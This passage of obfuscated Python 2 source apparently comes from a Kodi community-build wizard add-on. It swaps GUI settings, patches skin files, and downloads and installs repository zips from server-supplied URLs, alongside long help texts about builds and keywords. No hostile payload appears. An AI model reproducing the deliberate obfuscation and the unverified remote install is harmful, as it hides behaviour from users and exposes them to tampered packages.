    O0i1I11I = True
    if 24 - 24: O0
   except :
    print "### Problem removing guisettings"
    O0i1I11I = False
    if 33 - 33: OoooooooOO + ooOo * II111iiii / Oo
   try :
    print "### Attempting to replace guisettings with new"
    os . rename ( o0 , iIi1ii1I1 )
    O0i1I11I = True
    if 87 - 87: OoooooooOO
   except :
    print "### Failed to replace guisettings with new"
    O0i1I11I = False
    if 1 - 1: iIii1I11I1II1 / o0oOOo0O0Ooo
    if 98 - 98: O0 % I1IiiI / OoooooooOO * I1ii11iIi11i - ooOo
 if o00OO00OOo0 == 0 :
  I1I1IIiiii1ii = open ( ooOooo000oOO , mode = 'r' )
  ii1I1 = I1I1IIiiii1ii . read ( )
  I1I1IIiiii1ii . close ( )
  if 51 - 51: IIiIi1iI + OOOoOoo0O
  i1II111ii1ii = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( ii1I1 )
  O0ooOoO0OO000 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( ii1I1 )
  OOoOOO = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( ii1I1 )
  III1 = i1II111ii1ii [ 0 ] if ( len ( i1II111ii1ii ) > 0 ) else ''
  O00oOOoOOOOO = O0ooOoO0OO000 [ 0 ] if ( len ( O0ooOoO0OO000 ) > 0 ) else ''
  ii1IIiiIi1111Ii1 = OOoOOO [ 0 ] if ( len ( OOoOOO ) > 0 ) else ''
  if 54 - 54: II111iiii * O0 % I1IiiI . OOOoOoo0O
  if 62 - 62: O00OOo00oo0o . i11iIiiIii % O0 % IIi - Oo0Ooo
  iI1 = open ( o0 , mode = 'r' )
  iIIII1 = iI1 . read ( )
  iI1 . close ( )
  if 69 - 69: II111iiii . OoOoOO00 * OoOoOO00 % O00OOo00oo0o + I1IiiI
  i1111I1iii1 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( iIIII1 )
  o0Oo00o0 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( iIIII1 )
  i11II = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( iIIII1 )
  oOOoOo0Ooo = i1111I1iii1 [ 0 ] if ( len ( i1111I1iii1 ) > 0 ) else ''
  o0OOoOoo00 = o0Oo00o0 [ 0 ] if ( len ( o0Oo00o0 ) > 0 ) else ''
  Oo0Ooo0 = i11II [ 0 ] if ( len ( i11II ) > 0 ) else ''
  OOO = ii1I1 . replace ( III1 , oOOoOo0Ooo ) . replace ( ii1IIiiIi1111Ii1 , Oo0Ooo0 ) . replace ( O00oOOoOOOOO , o0OOoOoo00 )
  if 100 - 100: i11iIiiIii - Oo0Ooo
  OooooOOoo0 = open ( ooOooo000oOO , mode = 'w+' )
  OooooOOoo0 . write ( str ( OOO ) )
  OooooOOoo0 . close ( )
  if 47 - 47: IIiIi1iI * OoOoOO00 * IIiiiI1iIII
  if 46 - 46: O00OOo00oo0o
  if os . path . exists ( iIi1ii1I1 ) :
   if 42 - 42: iIii1I11I1II1
   try :
    os . remove ( iIi1ii1I1 )
    O0i1I11I = True
    if 32 - 32: Oo0Ooo - O00OOo00oo0o . OoooooooOO - OoooooooOO - Oo0Ooo . iIii1I11I1II1
   except :
    O0i1I11I = False
    if 34 - 34: Oo0Ooo
  try :
   os . rename ( ooOooo000oOO , iIi1ii1I1 )
   os . remove ( o0 )
   O0i1I11I = True
   if 31 - 31: i1IIi - OOOoOoo0O + IIi + iiiiiiii1 . iiiiiiii1 . O0
  except :
   O0i1I11I = False
   if 33 - 33: i1IIi / IIiIi1iI * OoO0O00
   if 2 - 2: ooOo . Oo
 if O0i1I11I == True or local == None :
  if 43 - 43: iIii1I11I1II1
  try :
   I1I1IIiiii1ii = open ( I1IIiiIiii , mode = 'r' )
   ii1I1 = I1I1IIiiii1ii . read ( )
   I1I1IIiiii1ii . close ( )
   if 29 - 29: IIiiiI1iIII % iiiiiiii1 + OoO0O00 . i1IIi + I1IiiI
   I111I = re . compile ( 'id="(.+?)"' ) . findall ( ii1I1 )
   oooOoo0OOoOo0 = re . compile ( 'name="(.+?)"' ) . findall ( ii1I1 )
   oO00oO0 = re . compile ( 'version="(.+?)"' ) . findall ( ii1I1 )
   o0o = I111I [ 0 ] if ( len ( I111I ) > 0 ) else ''
   I1Iii = oooOoo0OOoOo0 [ 0 ] if ( len ( oooOoo0OOoOo0 ) > 0 ) else ''
   I1IiII1I1i1I1 = oO00oO0 [ 0 ] if ( len ( oO00oO0 ) > 0 ) else ''
   if 33 - 33: o0oOOo0O0Ooo - ooOo % I1ii11iIi11i * OOOoOoo0O . OoooooooOO % O00OOo00oo0o
   OooooOOoo0 = open ( O000oo0O , mode = 'w+' )
   OooooOOoo0 . write ( 'id="' + str ( o0o ) + '"\nname="' + I1Iii + '"\nversion="' + I1IiII1I1i1I1 + '"\ngui="' + oOoO0oOO0o + '"' )
   OooooOOoo0 . close ( )
   if 29 - 29: IIiIi1iI + II111iiii . i11iIiiIii . O00OOo00oo0o - O0
   I1I1IIiiii1ii = open ( I11iii1Ii , mode = 'r' )
   ii1I1 = I1I1IIiiii1ii . read ( )
   I1I1IIiiii1ii . close ( )
   if 47 - 47: ooOo . I1ii11iIi11i - iIii1I11I1II1 % II111iiii / OoOoOO00 % OoooooooOO
   iiI1iI = re . compile ( 'version="(.+?)"' ) . findall ( ii1I1 )
   iiI111I1iIiI = iiI1iI [ 0 ] if ( len ( iiI1iI ) > 0 ) else ''
   OOO = ii1I1 . replace ( iiI111I1iIiI , I1IiII1I1i1I1 )
   if 13 - 13: IIiiiI1iIII . Oo0Ooo - OOOoOoo0O / ooOo - Oo0Ooo - I1IiiI
   OooooOOoo0 = open ( I11iii1Ii , mode = 'w' )
   OooooOOoo0 . write ( str ( OOO ) )
   OooooOOoo0 . close ( )
   os . remove ( I1IIiiIiii )
   if 84 - 84: II111iiii
  except :
   OooooOOoo0 = open ( O000oo0O , mode = 'w+' )
   OooooOOoo0 . write ( 'id="None"\nname="Unknown"\nversion="Unknown"\ngui="' + oOoO0oOO0o + '"' )
   OooooOOoo0 . close ( )
   if 57 - 57: O0 * iIii1I11I1II1 % O0 . OoooooooOO
   if 53 - 53: O00OOo00oo0o / I1IiiI * O00OOo00oo0o + o0oOOo0O0Ooo + ooOo - Oo0Ooo
 if os . path . exists ( os . path . join ( Oo0oOOo , 'profiles.xml' ) ) :
  os . remove ( os . path . join ( Oo0oOOo , 'profiles.xml' ) )
  time . sleep ( 1 )
  if 16 - 16: OoO0O00 % IIi . i1IIi / I1ii11iIi11i - O0
 if os . path . exists ( Oo0oOOo ) :
  os . removedirs ( Oo0oOOo )
  if 85 - 85: i1IIi . i1IIi
 Ii11i1I1 = xbmc . translatePath ( os . path . join ( iiI1IiI , I1IiI , 'notification.txt' ) )
 if 70 - 70: I1ii11iIi11i . I1ii11iIi11i / OOOoOoo0O . I1ii11iIi11i
 if os . path . exists ( Ii11i1I1 ) :
  os . remove ( Ii11i1I1 )
  if 37 - 37: i1IIi . IIi - II111iiii % o0oOOo0O0Ooo - i1IIi . ooOo
 if O0i1I11I == True :
  IiiiI11 ( )
  OoooOOo0oOO ( )
  if 34 - 34: iIii1I11I1II1 / II111iiii
  if 3 - 3: o0oOOo0O0Ooo - OoooooooOO + IIiIi1iI . OOOoOoo0O
  if 88 - 88: OOOoOoo0O - IIiIi1iI
def OOoOO0oOooo ( ) :
 o00OO00OoO = xbmc . getSkinDir ( )
 IIo0o0O0O00oOOo = xbmc . translatePath ( os . path . join ( II11iiii1Ii , o00OO00OoO ) )
 if 34 - 34: OOOoOoo0O % Oo0Ooo + O00OOo00oo0o
 for IIIiiiiiI1I , I1III111i , iiI1iii in os . walk ( IIo0o0O0O00oOOo ) :
  if 93 - 93: O00OOo00oo0o - IIi % O0
  for IIiI1i in iiI1iii :
   if 11 - 11: i11iIiiIii
   if 'DialogKeyboard.xml' in IIiI1i :
    o00OO00OoO = os . path . join ( IIIiiiiiI1I , IIiI1i )
    OO0OOoo0OOO = open ( o00OO00OoO ) . read ( )
    ooooOoo0OO = OO0OOoo0OOO . replace ( '<control type="label" id="310"' , '<control type="edit" id="312"' )
    IIiI1i = open ( o00OO00OoO , mode = 'w' )
    IIiI1i . write ( ooooOoo0OO )
    IIiI1i . close ( )
    III1III11II ( o00OO00OoO )
    if 6 - 6: II111iiii
    for O0ooO in range ( 48 , 58 ) :
     OOo00ooOoO0o ( O0ooO , o00OO00OoO )
     if 1 - 1: iiiiiiii1 % Oo0Ooo . ooOo
 iI111I11I1I1 = xbmcgui . Dialog ( )
 iI111I11I1I1 . ok ( "Skin Changes Successful" , 'A BIG thank you to Mikey1234 for this fix. The code used for this function was ported from the Xunity Maintenance add-on' )
 xbmc . executebuiltin ( 'ReloadSkin()' )
 if 98 - 98: II111iiii + II111iiii - iIii1I11I1II1 . OoOoOO00 . IIi
def OO0Ooo0O00ooOo0o ( ) :
 if iI111I11I1I1 . yesno ( 'Convert This Skin To Kodi (Helix)?' , 'This will fix the problem with a blank on-screen keyboard showing in skins designed for Gotham (being run on Kodi). This will only affect the currently running skin.' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Fix' ) :
  OOoOO0oOooo ( )
  if 40 - 40: OoO0O00 . OoooooooOO + i11iIiiIii
  if 90 - 90: IIiiiI1iIII * OOOoOoo0O % II111iiii / Oo
def o00oO0O000 ( ) :
 if iI111I11I1I1 . yesno ( "Hide Passwords" , "This will hide all your passwords in your" , "add-on settings, are you sure you wish to continue?" ) :
  for IIIiiiiiI1I , I1III111i , iiI1iii in os . walk ( II11iiii1Ii ) :
   for IIiI1i in iiI1iii :
    if IIiI1i == 'settings.xml' :
     oO0o0OoOOOO00o0 = open ( os . path . join ( IIIiiiiiI1I , IIiI1i ) ) . read ( )
     o0OO000ooOo = re . compile ( '<setting id=(.+?)>' ) . findall ( oO0o0OoOOOO00o0 )
     for O0ooo0 in o0OO000ooOo :
      if 'pass' in O0ooo0 :
       if not 'option="hidden"' in O0ooo0 :
        try :
         o00O00oO = O0ooo0 . replace ( '/' , ' option="hidden"/' )
         IIiI1i = open ( os . path . join ( IIIiiiiiI1I , IIiI1i ) , mode = 'w' )
         IIiI1i . write ( str ( oO0o0OoOOOO00o0 ) . replace ( O0ooo0 , o00O00oO ) )
         IIiI1i . close ( )
        except :
         pass
  iI111I11I1I1 . ok ( "Passwords Hidden" , "Your passwords will now show as stars (hidden), if you want to undo this please use the option to unhide passwords." )
  if 64 - 64: I1ii11iIi11i * O00OOo00oo0o * Oo0Ooo % IIiiiI1iIII % iiiiiiii1
  if 55 - 55: II111iiii - IIi - Oo % O00OOo00oo0o
def iI1I1iII1iII ( url ) :
 i1I1i1 = 'http://noobsandnerds.com/TI/Community_Builds/guisettings.php?id=%s' % ( url )
 O0OoooO0 = ooo0O0o00O ( i1I1i1 , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 i1Ii11ii = re . compile ( 'guisettings="(.+?)"' ) . findall ( O0OoooO0 )
 Iii1I11 = i1Ii11ii [ 0 ] if ( len ( i1Ii11ii ) > 0 ) else 'None'
 if 84 - 84: i11iIiiIii / o0oOOo0O0Ooo % iIii1I11I1II1 . iiiiiiii1 . OoO0O00 / IIiIi1iI
 OoO0ooOOoo ( Iii1I11 , local )
 if 55 - 55: IIiIi1iI
 if 3 - 3: iIii1I11I1II1
def IioO0oOo ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://install/",return)' )
 if 43 - 43: ooOo + OoOoOO00 . I1IiiI . i11iIiiIii
 if 71 - 71: o0oOOo0O0Ooo + Oo . Oo0Ooo - OoOoOO00 * i11iIiiIii . OoOoOO00
def ii ( repo_id ) :
 III11I = 1
 i1I1i1 = 'http://noobsandnerds.com/TI/AddonPortal/dependencyinstall.php?id=%s' % ( repo_id )
 O0OoooO0 = ooo0O0o00O ( i1I1i1 , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooo0 = re . compile ( 'name="(.+?)"' ) . findall ( O0OoooO0 )
 OO0o0oOOO0O = re . compile ( 'version="(.+?)"' ) . findall ( O0OoooO0 )
 oOIIiIi = re . compile ( 'repo_url="(.+?)"' ) . findall ( O0OoooO0 )
 OOoOooOoOOOoo = re . compile ( 'data_url="(.+?)"' ) . findall ( O0OoooO0 )
 Iiii1iI1i = re . compile ( 'zip_url="(.+?)"' ) . findall ( O0OoooO0 )
 O0O0Oo00 = re . compile ( 'repo_id="(.+?)"' ) . findall ( O0OoooO0 )
 oo000O0o = oOooo0 [ 0 ] if ( len ( oOooo0 ) > 0 ) else ''
 oOOo0oo0O = OO0o0oOOO0O [ 0 ] if ( len ( OO0o0oOOO0O ) > 0 ) else ''
 o0OoOOoOOoo = oOIIiIi [ 0 ] if ( len ( oOIIiIi ) > 0 ) else ''
 oo0O0 = OOoOooOoOOOoo [ 0 ] if ( len ( OOoOooOoOOOoo ) > 0 ) else ''
 Ii111Ii11 = Iiii1iI1i [ 0 ] if ( len ( Iiii1iI1i ) > 0 ) else ''
 Ii1II = O0O0Oo00 [ 0 ] if ( len ( O0O0Oo00 ) > 0 ) else ''
 o00oO = xbmc . translatePath ( os . path . join ( OOO00O , Ii1II + '.zip' ) )
 i11III1I1IiI = xbmc . translatePath ( os . path . join ( II11iiii1Ii , Ii1II ) )
 if 70 - 70: II111iiii * II111iiii . I1IiiI
 OOooO0OOoo . create ( 'Installing Repository' , 'Please wait...' , '' )
 if 11 - 11: IIiIi1iI
 try :
  i1OooO00oO00o = 'https://github.com/noobsandnerds/noobsandnerds/blob/master/zips/%s/%s-0.0.0.1.zip?raw=true' % ( repo_id , repo_id )
  downloader . download ( i1OooO00oO00o , o00oO , OOooO0OOoo )
  xbmc . log ( 'Download URL: %s' % i1OooO00oO00o )
  extract . all ( o00oO , II11iiii1Ii , OOooO0OOoo )
 except :
  try :
   downloader . download ( o0OoOOoOOoo , o00oO , OOooO0OOoo )
   extract . all ( o00oO , II11iiii1Ii , OOooO0OOoo )
  except :
   try :
    downloader . download ( Ii111Ii11 , o00oO , OOooO0OOoo )
    extract . all ( o00oO , II11iiii1Ii , OOooO0OOoo )
   except :
    try :
     if not os . path . exists ( i11III1I1IiI ) :
      os . makedirs ( i11III1I1IiI )
      if 14 - 14: I1ii11iIi11i * Oo0Ooo + i11iIiiIii % Oo - ooOo
     O0OoooO0 = ooo0O0o00O ( oo0O0 , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
     o0OO000ooOo = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( O0OoooO0 )
     if 11 - 11: I1ii11iIi11i / O0 + II111iiii
     for OooO0oOo in o0OO000ooOo :
      oOOo00O0OOOo = xbmc . translatePath ( os . path . join ( i11III1I1IiI , OooO0oOo ) )
      if 95 - 95: IIi + IIiiiI1iIII * iIii1I11I1II1
      if i11i1iiiII not in OooO0oOo and '/' not in OooO0oOo :
       if 17 - 17: OoO0O00 - Oo0Ooo * O0 / O00OOo00oo0o
       try :
        OOooO0OOoo . update ( 0 , "Downloading [COLOR=yellow]" + OooO0oOo + '[/COLOR]' , '' , 'Please wait...' )
        downloader . download ( oo0O0 + OooO0oOo , oOOo00O0OOOo , OOooO0OOoo )
        if 19 - 19: i1IIi - iIii1I11I1II1 . OOOoOoo0O
       except :
        print "failed to install" + OooO0oOo
        if 2 - 2: O00OOo00oo0o
      if '/' in OooO0oOo and '..' not in OooO0oOo and 'http' not in OooO0oOo :
       O0O00OOo = oo0O0 + OooO0oOo
       OoOOo ( oOOo00O0OOOo , O0O00OOo )
       if 12 - 12: i11iIiiIii - iIii1I11I1II1 * IIiiiI1iIII * IIiIi1iI
    except :
     iI111I11I1I1 . ok ( "Error downloading repository" , 'There was an error downloading[CR][COLOR=dodgerblue]' + oo000O0o + '[/COLOR]. Please consider updating the add-on portal with details or report the error on the forum at WWW.NOOBSANDNERDS.COM' )
     III11I = 0
     if 19 - 19: O0 + ooOo + o0oOOo0O0Ooo
     if 81 - 81: iIii1I11I1II1
 if III11I == 1 :
  iiIiii1IIIII ( showdialog = False )
  xbmc . sleep ( 1000 )
  OO00OO0o0 = '{"jsonrpc":"2.0", "method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":true}}' % repo_id
  oOOOooOo0O = xbmc . executeJSONRPC ( OO00OO0o0 )
  xbmc . log ( str ( OO00OO0o0 ) )
  xbmc . log ( str ( oOOOooOo0O ) )
  xbmc . log ( '### repo install was good' )
  OOooO0OOoo . update ( 0 , "[COLOR=yellow]" + oo000O0o + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Now installing dependencies' )
  OOooO0OOoo . close ( )
  Ooo0Oo0oo0 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( repo_id )
  try :
   ooo0O0o00O ( Ooo0Oo0oo0 , 5 )
  except :
   pass
  return True
 else :
  xbmc . log ( '### repo install failed returning false' )
  return False
  if 51 - 51: o0oOOo0O0Ooo . I1ii11iIi11i * O00OOo00oo0o / Oo0Ooo * II111iiii / O0
  if 44 - 44: i11iIiiIii % IIi % ooOo + OOOoOoo0O * ooOo . O00OOo00oo0o
def OoOo0Oooo0o ( ) :
 oOo00Ooo0o0 ( 'Creating A Backup To Share' ,
 '[COLOR=gold]THE OPTIONS:[/COLOR][CR]There are 3 options when choosing to create a backup, we shall explain here the differences between them:[CR][CR]'
 '[COLOR=dodgerblue]1. noobsandnerds Community Build[/COLOR] - This is by far the best way to create a build that you want to share with others, it will create a zip file for you to share that can only be used on with this add-on. The size of the zip will be incredibly small compared to other backup options out there and it will also do lots of other clever stuff too such as error checking against the Addon Portal and the addons will always be updated via the relevant developer repositories. Added to this when it comes to updating it\'s a breeze, only the new addons not already on the system will be installed and for the majority of builds Kodi won\'t even have to restart after installing![CR][CR]'
 '[COLOR=dodgerblue]2. Universal Build[/COLOR] - This was the original method created by TotalXBMC, we would really only recommend this if for some strange reason you want your build available on other inferior wizards. The zip size is much larger and every time someone wants to update their build they have to download and install the whole thing again which can be very frustrating and time consuming. The whole build is backed up in full with the exception of the packages and thumbnails folder. Just like the option above all physical paths (so long as they exist somewhere in the Kodi environment) will be changed to special paths so they work on all devices.[CR][CR]'
 '[COLOR=dodgerblue]3. Full Backup[/COLOR] - It\'s highly unlikely you will ever want to use this option and it\'s more for the geeks out there. It will create a complete backup of your setup and not do any extra clever stuff. Things like packages will remain intact as will temp cache files, be warned the size could be VERY large![CR][CR]'
 '[CR][COLOR=gold]CREATING A COMMUNITY BUILD:[/COLOR][CR][CR][COLOR=blue][B]Step 1:[/COLOR] Remove any sensitive data[/B][CR]Make sure you\'ve removed any sensitive data such as passwords and usernames in your addon_data folder.'
 '[CR][CR][COLOR=dodgerblue][B]Step 2:[/COLOR] Backup your system[/B][CR]Choose the backup option you want from the list on the previous page, if you\'re sharing this via the CP Addon then please use the noobsandnerds backup option, this will create two zip files that you need to upload to a server.'
 '[CR][CR][COLOR=dodgerblue][B]Step 3:[/COLOR] Upload the zips[/B][CR]Upload the two zip files to a server that Kodi can access, it has to be a direct link and not somewhere that asks for captcha - archive.org and copy.com are two good examples. Do not use Dropbox unless you have a paid account, they have a fair useage policy and the chances are you\'ll find within 24 hours your download has been blocked and nobody can download it. [COLOR=lime]Top Tip: [/COLOR]The vast majority of problems occur when the wrong download URL has been entered in the online form, a good download URL normally ends in "=1" or "zip=true". Please double check when you copy the URL into a web browser it immediately starts downloading without the need to press any other button.'
 '[CR][CR][COLOR=dodgerblue][B]Step 4:[/COLOR] Submit the build[/B]'
 '[CR]Create a thread on the Community Builds section of the forum at [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR].[CR]Full details can be found on there of the template you should use when posting, once you\'ve created your support thread (NOT BEFORE) you can request to become a member of the Community Builder group and you\'ll then be able to add your build via the web form. As soon as you\'ve successfully added the details your build will be live, if you can\'t find it in the CP addon make sure you have XXX enabled (if you marked it as having adult content) and also make sure you\'re running the same version of Kodi that you said it was compatible with. If you\'re running another version then you can select the option to "show all community builds" in the addon settings and that will show even the builds that aren\'t marked as compatible with your version of Kodi.'
 '[CR][CR][COLOR=gold]PRIVATE BUILDS[/COLOR][CR]If you aren\'t interested in sharing your build with the community you can still use our system for private builds. Just follow the instructions above but you will not need to create a support thread and you WILL require a minimum of 5 useful (not spam) posts on the forum. The 5 post rule only applies to users that wish to use the private builds option. Once you have 5 posts you\'ll be able to access the web form and in there you can enter up to 3 IP addresses that you want to be able to view your build(s). Anybody caught disobeying the forum rules will be banned so please make sure you understand the forum rules before posting, we welcome everyone but there is strictly no spamming or nonsense posts just saying something like "Thanks" in order to bump up your post count. The site rules even have examples of how you can get to 5 posts without receiving a ban.' )
 if 65 - 65: OoOoOO00 + IIi % I1IiiI
 if 54 - 54: IIi / o0oOOo0O0Ooo
def I11IIIIiII ( ) :
 oOo00Ooo0o0 ( 'Installing a build' , '[COLOR=dodgerblue][B]Step 1 (Optional):[/COLOR] Backup your system[/B][CR]When selecting an install option you\'ll be asked if you want to create a backup - we strongly recommend creating a backup of your system in case you don\'t like the build and want to revert back. Remember your backup may be quite large so if you\'re using a device with a very small amount of storage we recommend using a USB stick or SD card as the storage location otherwise you may run out of space and the install may fail.'
 '[CR][CR][COLOR=dodgerblue][B]Step 2:[/COLOR] Choose an install method:[/B][CR][CR]-------------------------------------------------------[CR][CR][COLOR=gold]1. Overwrite my current setup & install new build:[/COLOR] This copy over the whole build[CR]As the title suggests this will overwrite your existing setup with the one created by the community builder. We recommend using the wipe option in the maintenance section before running this, that will completely wipe your existing settings and will ensure you don\'t have any conflicting data left on the device. Once you\'ve wiped please restart Kodi and install the build, you can of course use this install option 1 without wiping but you may encounter problems. If you choose to do this DO NOT bombard the community builder with questions on how to fix certain things, they will expect you to have installed over a clean setup and if you\'ve installed over another build the responsibility for bug tracking lies solely with you!'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=gold]2. Install:[/COLOR] Keep my library & profiles[CR]This will install a build over the top of your existing setup so you won\'t lose anything already installed in Kodi. Your library and any profiles you may have setup will also remain unchanged.'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=gold]3. Install:[/COLOR] Keep my library only[CR]This will do exactly the same as number 2 (above) but it will delete any profiles you may have and replace them with the ones the build author has created.'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=gold]4. Install:[/COLOR] Keep my profiles only[CR]Again, the same as number 2 but your library will be replaced with the one created by the build author. If you\'ve spent a long time setting up your library and have it just how you want it then use this with caution and make sure you do a backup!'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=dodgerblue][B]Step 3:[/COLOR] Replace or keep settings?[/B][CR]When completing the install process you\'ll be asked if you want to keep your existing Kodi settings or replace with the ones in the build. If you choose to keep your settings then only the important skin related settings are copied over from the build. All your other Kodi settings such as screen calibration, region, audio output, resolution etc. will remain intact. Choosing to replace your settings could possibly cause a few issues, unless the build author has specifically recommended you replace the settings with theirs we would always recommend keeping your own.'
 '[CR][CR][COLOR=dodgerblue][B]Step 4: [/COLOR][COLOR=red]VERY IMPORTANT[/COLOR][/B][CR]For the install to complete properly Kodi MUST force close, this means forcing it to close via your operating system rather than elegantly via the Kodi menu. By default this add-on will attempt to make your operating system force close Kodi but there are systems that will not allow this (devices that do not allow Kodi to have root permissions).'
 ' Once the final step of the install process has been completed you\'ll see a dialog explaining Kodi is attempting a force close, please be patient and give it a minute. If after a minute Kodi hasn\'t closed or restarted you will need to manually force close. The recommended solution for force closing is to go into your operating system menu and make it force close the Kodi app but if you dont\'t know how to do that you can just pull the power from the unit.'
 ' Pulling the power is fairly safe these days, on most set top boxes it\'s the only way to switch them off - they rarely have a power switch. Even though it\'s considered fairly safe nowadays you do this at your own risk and we would always recommend force closing via the operating system menu.' )
 if 52 - 52: II111iiii / II111iiii / I1IiiI - IIi
 if 91 - 91: I1IiiI + o0oOOo0O0Ooo % II111iiii + OoO0O00
def Oo0o0OOo0Oo0 ( ) :
 oOo00Ooo0o0 ( 'What is a noobsandnerds keyword?' , '[COLOR=gold]WHAT IS A KEYWORD?[/COLOR][CR]The noobsandnerds keywords are based on the ingenious TLBB keyword system that was introduced years ago. It\'s nothing new and unlike certain other people out there we\'re not going to claim it as our idea. If you\'re already familiar with TLBB Keywords or even some of the copies out there like Cloudwords you will already know how this works but for those of you that don\'t have one of those devices we\'ll just go through the details...'
 '[CR][CR]Anyone in the community can make their own keywords and share them with others, it\'s a simple word you type in and then the content you uploaded to the web is downloaded and installed. Previously keywords have mostly been used for addon packs, this is a great way to get whole packs of addons in one go without the need to install a whole new build. We are taking this to the next level and will be introducing artwork packs and also addon fixes. More details will be available in the Community Portal section of the forum on www.noobsandnerds.com'
 '[CR][CR][CR][COLOR=gold]HOW DO I FIND A KEYWORD?[/COLOR][CR]The full list of noobsandnerds keywords can be found on the forum, in the Community Portal section you\'ll see a section for the keywords at the top of the page. Just find the pack you would like to install then using this addon type the keyword in when prompted (after clicking "Install a noobsandnerds keyword"). Your content will now be installed, if installing addon packs please be patient while each addon updates to the latest version directly from the developers repo.'
 '[CR][CR][CR][COLOR=gold]CAN I USE OTHER KEYWORDS?[/COLOR] (Cloudwords, TLBB etc.)[CR]Yes you can, just go to the addon settings and enter the url shortener that particular company use. Again you will find full details of supported keywords on the forum.' )
 if 88 - 88: O00OOo00oo0o / OoooooooOO % OoOoOO00 - i1IIi
 if 49 - 49: o0oOOo0O0Ooo - iIii1I11I1II1
def o00oo00O0OoOo ( ) :
 oOo00Ooo0o0 ( 'How to create a keyword?' , '[COLOR=gold]NaN MAKE IT EASY![/COLOR][CR]The keywords can now be made very simply by anyone. We\'ve not locked this down to just our addon and others can use this on similar systems for creating keywords if they want...'
 '[CR][CR][COLOR=dodgerblue][B]Step 1:[/COLOR] Use a vanilla Kodi setup[/B][CR]You will require a complete fresh install of Kodi with absolutely nothing else installed and running the default skin. Decide what kind of pack you want to create, lets say we want to create a kids pack... Add all the kid related addons you want and make sure you also have the relevant repository installed too. In the unlikely event you\'ve found an addon that doesn\'t belong in a repository that\'s fine the system will create a full backup of that addon too (just means it won\'t auto update with future updates to the addon).'
 '[CR][CR][COLOR=dodgerblue][B]Step 2:[/COLOR] Create the backup[/B][CR]Using this addon create your backup, currently only addon packs are supported but soon more packs will be added. When you create the keyword you\'ll be asked for a location to store the zip file that will be created and a name, this can be anywhwere you like and can be called whatever you want - you do not need to add the zip extension, that will automatically be added for you so in our example here we would call it "kids".'
 '[CR][CR][COLOR=dodgerblue][B]Step 3:[/COLOR] Upload the zips[/B][CR]Upload the two zip file to a server that Kodi can access, it has to be a direct link and not somewhere that asks for captcha - archive.org and copy.com are two good examples. Do not use Dropbox unless you have a paid account, they have a fair useage policy and the chances are you\'ll find within 24 hours your download has been blocked and nobody can download it.[CR][CR][COLOR=lime]Top Tip: [/COLOR]The vast majority of problems occur when the wrong download URL has been entered in the online form, a good download URL normally ends in "=1" or "zip=true". Please double check when you copy the URL into a web browser it immediately starts downloading without the need to press any other button.'
 '[CR][CR][COLOR=dodgerblue][B]Step 4:[/COLOR] Create the keyword[/B][CR]Copy the download URL to your clipboard and then go to www.urlshortbot.com. In here you need to enter the URL in the "Long URL" field and then in the "Custom Keyword" field you need to enter "noobs" (without the quotation marks) followed by your keyword. We recommend always using a random test keyword for testing because once you have a keyword you can\'t change it, also when uploading make sure it\'s a link you can edit and still keep the same URL - that way it\'s easy to keep up to date and you can still use the same keyword. In our example of kids we would set the custom keyword as "noobskids". The noobs bit is ignored and is only for helping the addon know what to look for, the user would just type in "kids" for the kids pack to be installed.' )
 if 6 - 6: I1ii11iIi11i * Oo0Ooo + iIii1I11I1II1
 if 19 - 19: O0 % II111iiii * o0oOOo0O0Ooo
def I1i1IiIIiIiII ( ) :
 oOo00Ooo0o0 ( 'Adding Third Party Wizards' , '[COLOR=gold]ONE WIZARD TO RULE THEM ALL![/COLOR][CR]Did you know the vast majority of wizards out there (every single one we\'ve tested) has just been a copy/paste of very old code created by the team here? We\'ve noticed a lot of the users installing builds via these third party wizards have run into many different problems so we thought we\'d take it upon ourselves to help out...'
 '[CR][CR][CR][COLOR=gold]WHAT BENEFITS DOES THIS HAVE?[/COLOR][CR]We\'ve added extra code that checks for common errors, unfortunately there are some people out there using inferior programs to create their backups and that is causing problems in their wizards. If such a problem exists when trying to use another wizard you can try adding the details to this addon and it automatically fixes any corrupt files it finds. Of course there are other benefits... installing code from an unknown source can give the author access to your system so make sure you always trust the author(s). Why take the risk of installing wizards created by anonymous usernames on social media sites when you can install from a trusted source like noobsandnerds and you\'ll also be safe in the knowledge that any new updates and improvements will be made here first - we do not copy/paste code, we are actively creating new exciting solutions!'
 '[CR][CR][CR][COLOR=gold]ADDING 3RD PARTY WIZARDS TO THIS ADDON[/COLOR][CR][CR][COLOR=dodgerblue][B]Step 1:[/COLOR] Enabling 3rd Party Wizards[/B][CR]In the addon settings under the Community Builds section you have the option to enable third party community builds, if you click on this you will be able to enter details of up to 5 different wizards.'
 '[CR][CR][COLOR=dodgerblue][B]Step 2:[/COLOR] Enter the URL[/B][CR]As virtually all wizards use exactly the same structure all you need to do is find out what URL they are looking up in the code, you can open the default.py file of the wizard in a text editor and search for "http" and you will more than likely find the URL straight away. Try entering it in a web address, it should show the details for all the builds in that wizard in a text based page. If the page is blank don\'t worry it may just be locked from web browsers and can only be opened in Kodi, try it out and see if it works.'
 '[CR][CR][COLOR=dodgerblue][B]Step 3:[/COLOR] Enter the name[/B][CR]Give the wizard a name, now when you go into the Community Builds section you\'ll have the official noobsandnerds builds as an option and also any new ones you\'ve added.' )
